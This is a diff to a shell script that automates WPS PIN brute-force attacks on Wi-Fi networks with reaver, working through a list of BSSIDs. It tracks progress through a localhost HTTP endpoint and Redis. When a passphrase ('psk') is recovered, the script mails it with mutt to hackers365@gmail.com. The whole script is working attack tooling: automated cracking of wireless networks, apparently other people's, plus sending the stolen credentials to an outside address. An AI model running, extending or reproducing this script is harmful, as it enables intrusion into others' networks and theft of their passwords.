@@ -6,6 +6,7 @@ REMIND_EMAIL='hackers365@gmail.com'
 LOG_FILE="/tmp/reaver_out.log"
 MAX_NUM=10
 MONTOR_LOG_BIN=`pwd`/tail_log.sh
+URL_PREFIX='http://127.0.0.1/util?i_am_cmd=1'
 
 touch /root/success.log
 if [ $# -eq 1 ];then
@@ -22,15 +23,16 @@ fi
 echo "set current_reaver_sh_pid $$" | redis-cli
 for i in $ssid
 do
-    if !(grep -q $i /root/success.log);then
+    result=`curl "${URL_PREFIX}&act=already_pj_bssid&bssid=${i}"`
+    echo $result >> /tmp/tmp.log
+    if echo $result|grep -q -i 'fail';then
         #echo 'begin pins bssid: ' $i
-        echo "set current_pin_mac '$i'" | redis-cli
+        curl "${URL_PREFIX}&act=set_current_pin_bssid&bssid=${i}"
         /usr/local/bin/reaver -i $INTERFACE -b $i -a -v -o $LOG_FILE &
         #$MONTOR_LOG_BIN $! $LOG_FILE
         echo "set current_reaver_pid $!" | redis-cli
         wait
         result=`tail -n3 $LOG_FILE`
-        echo 'need exit' >> $LOG_FILE
         if echo $result|grep -q -i 'psk';then
               echo $result|mutt -s 'get password' hackers365@gmail.com
               echo "######################" >> /root/success.log
@@ -43,3 +45,4 @@ do
     fi
 done
 echo "del current_reaver_sh_pid" | redis-cli
+echo '$exit$' >> $LOG_FILE
